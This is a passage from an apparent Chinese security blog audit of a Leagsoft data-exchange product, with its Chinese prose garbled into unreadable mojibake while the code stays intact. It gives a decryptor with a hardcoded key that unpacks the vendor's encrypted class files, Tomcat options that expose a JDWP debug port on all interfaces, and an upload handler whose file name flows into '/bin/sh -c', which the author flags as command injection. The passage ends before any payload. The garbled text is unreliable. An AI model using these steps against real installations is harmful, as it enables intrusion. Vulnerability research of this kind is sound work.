</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> getConfig() {
</span></span><span style=display:flex><span>        iniConfig();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> configMap;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//// ECFileIni.getIni();
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ECFileIni</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> String file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;../../Ini/ECFile.ini&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> INIImpl self <span style=color:#f92672>=</span> null;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> {
</span></span><span style=display:flex><span>        self <span style=color:#f92672>=</span> init();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>ECFileIni</span>() {
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> INIImpl <span style=color:#a6e22e>init</span>() {
</span></span><span style=display:flex><span>        String code <span style=color:#f92672>=</span> FileEncode.getFileEncode(file);
</span></span><span style=display:flex><span>        INIImpl iniFile <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;asci&#34;</span>.equals(code) <span style=color:#f92672>?</span> INIUtil.getInstance(file) <span style=color:#f92672>:</span> INIUtil.getInstance(file, code);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> iniFile;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>getStringProperty</span>(String section, String property) {
</span></span><span style=display:flex><span>        String rs <span style=color:#f92672>=</span> self.getStringProperty(section, property);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;null&#34;</span>.equals(rs) <span style=color:#f92672>?</span> null : rs;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> INIImpl <span style=color:#a6e22e>getIni</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> self;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>æ°å¥½æˆ‘åœ¨æœåŠ¡å™¨ä¸Šæ‰¾åˆ°äº†è¿™ä¸ªæ–‡ä»¶ ECFile.ini ï¼š</p><p><a href=https://images.payloads.online/2024-07-29-4c6797f665e41e879b8544677a77a9fb4f74bd6ba6ba16e6abaab6c5894f72c8.png data-fancybox=gallery data-caption=6><img src=https://images.payloads.online/2024-07-29-4c6797f665e41e879b8544677a77a9fb4f74bd6ba6ba16e6abaab6c5894f72c8.png alt=6></a></p><p>å†çœ‹çœ‹<code>AgentTransformer</code> çš„å®ç°ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>AgentTransformer</span> <span style=color:#66d9ef>implements</span> ClassFileTransformer {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>[]</span> pwd;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>AgentTransformer</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>[]</span> pwd) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>pwd</span> <span style=color:#f92672>=</span> pwd;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>transform</span>(ClassLoader loader, String className, Class<span style=color:#f92672>&lt;?&gt;</span> classBeingRedefined, ProtectionDomain domain, <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> classBuffer) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (className <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> domain <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> loader <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>            String projectPath <span style=color:#f92672>=</span> domain.<span style=color:#a6e22e>getCodeSource</span>().<span style=color:#a6e22e>getLocation</span>().<span style=color:#a6e22e>getPath</span>();
</span></span><span style=display:flex><span>            projectPath <span style=color:#f92672>=</span> JarUtils.<span style=color:#a6e22e>getRootPath</span>(projectPath);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (StrUtils.<span style=color:#a6e22e>isEmpty</span>(projectPath)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> classBuffer;
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                className <span style=color:#f92672>=</span> className.<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#e6db74>&#34;.&#34;</span>).<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#34;\\&#34;</span>, <span style=color:#e6db74>&#34;.&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> JarDecryptor.<span style=color:#a6e22e>getInstance</span>().<span style=color:#a6e22e>doDecrypt</span>(projectPath, className, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>pwd</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> bytes <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> bytes<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span>54 <span style=color:#f92672>&amp;&amp;</span> bytes<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span>2 <span style=color:#f92672>&amp;&amp;</span> bytes<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span>70 <span style=color:#f92672>&amp;&amp;</span> bytes<span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> <span style=color:#f92672>==</span> <span style=color:#f92672>-</span>66 <span style=color:#f92672>?</span> bytes : classBuffer;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> classBuffer;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p><code>AgentTransformer</code> é‡å†™äº†<code>ClassFileTransformer</code>çš„<code>transform</code>æ–¹æ³•ï¼Œå°†æ¯ä¸€ä¸ªclasså’Œå¯†ç æ”¾å…¥<code>JarDecryptor.doDecrypt</code>è¿›è¡Œè§£å¯†ï¼Œæœ€ç»ˆè¿”å›å­—èŠ‚ç ã€‚</p><p>å†æ¥çœ‹çœ‹<code>JarDecryptor.doDecrypt</code>çš„å®ç°ï¼š</p><p><a href=https://images.payloads.online/2024-07-29-6ac72116d00abdb02053e3b552699cc6179a6f2e604f1464dd560c268f157a43.png data-fancybox=gallery data-caption=7><img src=https://images.payloads.online/2024-07-29-6ac72116d00abdb02053e3b552699cc6179a6f2e604f1464dd560c268f157a43.png alt=7></a></p><p>é€šè¿‡<code>readEncryptedFile</code> æ–¹æ³•è¯»å–**<code>META-INF/.classes/</code>** ä¸‹çš„classæ–‡ä»¶è¿›è¡Œè§£å¯†ã€‚</p><p>å›åˆ°æ–‡ä»¶ç›®å½•ï¼Œåœ¨META-INFä¸‹å‘ç°äº†è®¸å¤šåŠ å¯†çš„classå­—èŠ‚ç æ–‡ä»¶ï¼š</p><p><a href=https://images.payloads.online/2024-07-29-1c776fe4fe02193807e9a09ffeb672546340052de6e74e835d097554c05325f0.png data-fancybox=gallery data-caption=8><img src=https://images.payloads.online/2024-07-29-1c776fe4fe02193807e9a09ffeb672546340052de6e74e835d097554c05325f0.png alt=8></a></p><p>è¿™é‡Œæˆ‘é€šè¿‡ç¼–å†™ä¸€ä¸ªç±»ï¼Œè°ƒç”¨<code>JarDecryptor.doDecrypt</code>å¯¹å…¨éƒ¨classè¿›è¡Œäº†è§£å¯†ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.leagsoft.declass.util.ECFileConfig;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.leagsoft.declass.util.EncryptUtils;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.leagsoft.declass.util.IoUtils;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.leagsoft.declass.util.StrUtils;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.File;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Main</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> String ENCRYPT_PATH <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;UniEx/META-INF/.classes/&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> String DECRYPT_PATH <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;UniEx-decode/UniExdecrypt/&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>getPassword</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            File file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#34;UniEx/ec.file&#34;</span>);
</span></span><span style=display:flex><span>            Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> configMap <span style=color:#f92672>=</span> ECFileConfig.<span style=color:#a6e22e>getConfig</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> IoUtils.<span style=color:#a6e22e>readFileToByte</span>(file);
</span></span><span style=display:flex><span>            String pf <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;UniNXG-KUv1N5FQr9NtPWnK5UpJ8nnM3blCH9jYtGoXeo0bsXowOffDnW2o0DaVo41ZblSF0tNow5dPxVn8odAS9l4QxCiSvGTXhbliZF9W&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> by <span style=color:#f92672>=</span> EncryptUtils.<span style=color:#a6e22e>de</span>(bytes, pf.<span style=color:#a6e22e>toCharArray</span>(), 1);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>char</span> password<span style=color:#f92672>[]</span> <span style=color:#f92672>=</span> EncryptUtils.<span style=color:#a6e22e>rsk</span>(<span style=color:#66d9ef>new</span> String(by)).<span style=color:#a6e22e>toCharArray</span>();
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(password);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> password;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(e);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>         <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>char</span> password<span style=color:#f92672>[]</span> <span style=color:#f92672>=</span> getPassword();
</span></span><span style=display:flex><span>        File classFiles <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(ENCRYPT_PATH);
</span></span><span style=display:flex><span>        File<span style=color:#f92672>[]</span> fs <span style=color:#f92672>=</span> classFiles.<span style=color:#a6e22e>listFiles</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (File classFile : fs){
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(classFile.<span style=color:#a6e22e>getAbsolutePath</span>());
</span></span><span style=display:flex><span>            File file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(ENCRYPT_PATH, classFile.<span style=color:#a6e22e>getName</span>());
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> IoUtils.<span style=color:#a6e22e>readFileToByte</span>(file);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (bytes <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> ;
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>char</span><span style=color:#f92672>[]</span> pass <span style=color:#f92672>=</span> StrUtils.<span style=color:#a6e22e>merger</span>(<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>[][]</span>{password, classFile.<span style=color:#a6e22e>getName</span>().<span style=color:#a6e22e>toCharArray</span>()});
</span></span><span style=display:flex><span>                bytes <span style=color:#f92672>=</span> EncryptUtils.<span style=color:#a6e22e>de</span>(bytes, pass, 1);
</span></span><span style=display:flex><span>                System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;æ­£åœ¨è§£å¯†... &#34;</span> <span style=color:#f92672>+</span> classFile.<span style=color:#a6e22e>getName</span>());
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>try</span>{
</span></span><span style=display:flex><span>                    File outFile <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(DECRYPT_PATH<span style=color:#f92672>+</span> classFile.<span style=color:#a6e22e>getName</span>()<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;.class&#34;</span>);
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>outFile.<span style=color:#a6e22e>exists</span>()){
</span></span><span style=display:flex><span>                        outFile.<span style=color:#a6e22e>createNewFile</span>();
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    FileOutputStream outputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileOutputStream(outFile);
</span></span><span style=display:flex><span>                    outputStream.<span style=color:#a6e22e>write</span>(bytes);
</span></span><span style=display:flex><span>                }<span style=color:#66d9ef>catch</span> (Exception e){
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><a href=https://images.payloads.online/2024-07-29-caca69621b0ac31050dfbda096c260c6dbca086b742f059138ecda98f14935a6.png data-fancybox=gallery data-caption=9><img src=https://images.payloads.online/2024-07-29-caca69621b0ac31050dfbda096c260c6dbca086b742f059138ecda98f14935a6.png alt=9></a></p><p>è·‘ä¸€ä¸‹Mainæ–¹æ³•å°±èƒ½å°†æ‰€æœ‰çš„åŠ å¯†classå­—èŠ‚ç æ–‡ä»¶è¿˜åŸï¼Œå¤§åŠŸå‘Šæˆã€‚</p><h3 id=è¿œç¨‹è°ƒè¯•tomcat>è¿œç¨‹è°ƒè¯•Tomcat</h3><p>ä¿®æ”¹Tomcatå®‰è£…ç›®å½•ä¸‹<code>bin/catalina.sh</code> æ–‡ä»¶ï¼Œé€šè¿‡å®šä¹‰catalinaçš„é…ç½®é€‰é¡¹å¯ä»¥åœ¨tomcatå¯åŠ¨æ—¶å¼€å¯è¿œç¨‹è°ƒè¯•ç«¯å£ã€‚</p><p>ä¿®æ”¹æ–‡ä»¶ï¼š<code>/home/leagsoft/SafeDataExchange/Apache/bin/catalina.sh</code></p><p><a href=https://images.payloads.online/2024-07-29-a569bb52b5db158da8c9ca25ec36e8386843cfdec60410570ab2ebc3945c73c8.png data-fancybox=gallery data-caption=10><img src=https://images.payloads.online/2024-07-29-a569bb52b5db158da8c9ca25ec36e8386843cfdec60410570ab2ebc3945c73c8.png alt=10></a></p><p>åŠ å…¥å†…å®¹ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span>CATALINA_OPTS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:9999&#34;</span>
</span></span></code></pre></div><p>ç„¶åé‡å¯tomcatå°±å¯ä»¥è¿›è¡Œè¿œç¨‹è°ƒè¯•äº†ã€‚
<a href=https://images.payloads.online/2024-07-29-5286ff18ed77057ec7661589dae2390349c3688a64954c35f0addee8fa0ea1e2.png data-fancybox=gallery data-caption=15><img src=https://images.payloads.online/2024-07-29-5286ff18ed77057ec7661589dae2390349c3688a64954c35f0addee8fa0ea1e2.png alt=15></a></p><p>æ‰“å¼€ideaï¼Œå°†åŸæœ¬æ²¡æœ‰æ–¹æ³•å®ç°çš„classæ›¿æ¢ä¸ºå·²ç»è§£å¯†çš„classï¼Œæ·»åŠ è¿œç¨‹è°ƒè¯•é…ç½®ï¼š</p><p>è¿™é‡Œæˆ‘æ›¿æ¢äº†ï¼š</p><p><code>WEB-INF/classes/com/leagsoft/nxg/dlp/controller/FileTrackMarkMessageController.class</code></p><p><a href=https://images.payloads.online/2024-07-29-291090c034eb14e7c54f6e8134dc4cffdc90c2caa137d8d9a3995cd5b2949607.png data-fancybox=gallery data-caption=11><img src=https://images.payloads.online/2024-07-29-291090c034eb14e7c54f6e8134dc4cffdc90c2caa137d8d9a3995cd5b2949607.png alt=11></a></p><p>æ·»åŠ ä¸€ä¸ªè°ƒè¯•é…ç½®ï¼Œç‚¹å‡»Edit Configurationsï¼š</p><p><a href=https://images.payloads.online/2024-07-29-72fed2f81a5857e1322cae31988c98a99f20535cf1df7489fba34e662dcb5e04.png data-fancybox=gallery data-caption=12><img src=https://images.payloads.online/2024-07-29-72fed2f81a5857e1322cae31988c98a99f20535cf1df7489fba34e662dcb5e04.png alt=12></a></p><p>ç‚¹å‡»æ·»åŠ æŒ‰é’®ï¼Œæ–°å¢ä¸€ä¸ªRemoteé…ç½®ï¼š</p><p><a href=https://images.payloads.online/2024-07-29-5571001140fb45b5e6dd403647aee8c9bfffd6d485fa5a99810841f799c32665.png data-fancybox=gallery data-caption=13><img src=https://images.payloads.online/2024-07-29-5571001140fb45b5e6dd403647aee8c9bfffd6d485fa5a99810841f799c32665.png alt=13></a></p><p>å¡«å…¥è¿œç¨‹è°ƒè¯•çš„IPåœ°å€å’Œç«¯å£ï¼š</p><p><a href=https://images.payloads.online/2024-07-29-470690a9c80ba81dce667b1dbc496df19c644658e99f5fe727cf52adc312dd2d.png data-fancybox=gallery data-caption=14><img src=https://images.payloads.online/2024-07-29-470690a9c80ba81dce667b1dbc496df19c644658e99f5fe727cf52adc312dd2d.png alt=14></a></p><p>ç„¶ååœ¨è¦è°ƒè¯•çš„æ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œç‚¹å‡»è°ƒè¯•æŒ‰é’®ï¼Œæ§åˆ¶å°ä¼šæç¤ºå·²ç»è¿æ¥åˆ°ç›®æ ‡JVMï¼š</p><p><a href=https://images.payloads.online/2024-07-29-caec6aa5c122933badd4c5d86d3cbfeaa93ac49c5d8055109b72018d7be87eda.png data-fancybox=gallery data-caption=16><img src=https://images.payloads.online/2024-07-29-caec6aa5c122933badd4c5d86d3cbfeaa93ac49c5d8055109b72018d7be87eda.png alt=16></a></p><p>å½“è®¿é—®åˆ°å¯¹åº”çš„æ§åˆ¶å™¨ï¼Œå¹¶ä¸”ä»£ç æ‰§è¡Œæ—¶ï¼Œæ–­ç‚¹ä¼šç”Ÿæ•ˆï¼š</p><p><a href=https://images.payloads.online/2024-07-29-b98190a484595ca8a2b7c07def77f2f5c12a80c12bf45c60bdb06e0c5a07e0a3.png data-fancybox=gallery data-caption=17><img src=https://images.payloads.online/2024-07-29-b98190a484595ca8a2b7c07def77f2f5c12a80c12bf45c60bdb06e0c5a07e0a3.png alt=17></a></p><p>é€šè¿‡è§‚å¯Ÿè°ƒç”¨æ ˆã€å±€éƒ¨å˜é‡çš„å€¼å¯ä»¥å¾ˆæ–¹ä¾¿çš„å¸®åŠ©æˆ‘ä»¬è¿›è¡Œè¾“å…¥è¾“å‡ºçš„åˆ¤æ–­ã€‚</p><h3 id=åå°å‘½ä»¤æ‰§è¡Œä¸€>åå°å‘½ä»¤æ‰§è¡Œä¸€</h3><p>é€šè¿‡å®¡è®¡å‘ç°<code>FileTrackMarkMessageController.class</code>ä¸­çš„<code>getUploadFileID</code> æ–¹æ³•è°ƒç”¨äº†<code>Runtime.getRuntime().exec</code> å¯èƒ½ä¼šå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>getUploadFileID</span>(HttpServletRequest request, HttpServletResponse response) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>FileItem<span style=color:#f92672>&gt;</span> fileList <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList();
</span></span><span style=display:flex><span>        ModelAndViewUtil.getMultiParamterMap(request, fileList);
</span></span><span style=display:flex><span>        String separator <span style=color:#f92672>=</span> File.separator;
</span></span><span style=display:flex><span>        File detect <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;Bin&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>detect.exists()) {
</span></span><span style=display:flex><span>            detect.mkdirs();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        JObject jo <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> JObject();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (fileList.size() <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>            String fileID <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>            Iterator var8 <span style=color:#f92672>=</span> fileList.iterator();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span>(var8.hasNext()) {
</span></span><span style=display:flex><span>                FileItem file <span style=color:#f92672>=</span> (FileItem)var8.next();
</span></span><span style=display:flex><span>                String simpleName <span style=color:#f92672>=</span> SysUtils.getSimpleName(file.getName().replaceAll(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;/&#34;</span>));
</span></span><span style=display:flex><span>                file.write(<span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;Bin&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> simpleName));
</span></span><span style=display:flex><span>                String postfix <span style=color:#f92672>=</span> simpleName.substring(simpleName.lastIndexOf(<span style=color:#e6db74>&#34;.&#34;</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, simpleName.length());
</span></span><span style=display:flex><span>                String comd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;Bin&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;ClairDeLune printall &#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;Bin&#34;</span> <span style=color:#f92672>+</span> separator <span style=color:#f92672>+</span> simpleName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; &#34;</span> <span style=color:#f92672>+</span> postfix;
</span></span><span style=display:flex><span>                Process p <span style=color:#f92672>=</span> null;
</span></span><span style=display:flex><span>                String[] command <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> String[]{<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, comd};
</span></span><span style=display:flex><span>                p <span style=color:#f92672>=</span> Runtime.getRuntime().exec(command);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                .......
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>æˆ‘ä»¬çš„è¾“å…¥ç‚¹æ˜¯requestå¯¹è±¡ï¼Œå®ƒè¢«ä¼ å…¥äº†<code>getMultiParamterMap</code>æ–¹æ³•ï¼Œè·Ÿè¿›æŸ¥çœ‹ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> getMultiParamterMap(HttpServletRequest request, List<span style=color:#f92672>&lt;</span>FileItem<span style=color:#f92672>&gt;</span> fileList) <span style=color:#66d9ef>throws</span> FileUploadException {
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> param <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TreeMap();
</span></span><span style=display:flex><span>        FileItemFactory factory <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> DiskFileItemFactory();
</span></span><span style=display:flex><span>        ServletFileUpload upload <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ServletFileUpload(factory);
</span></span><span style=display:flex><span>        List items <span style=color:#f92672>=</span> null;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            items <span style=color:#f92672>=</span> upload.parseRequest(request);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception var10) {
</span></span><span style=display:flex><span>            LOG.error(var10.getMessage());
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ......
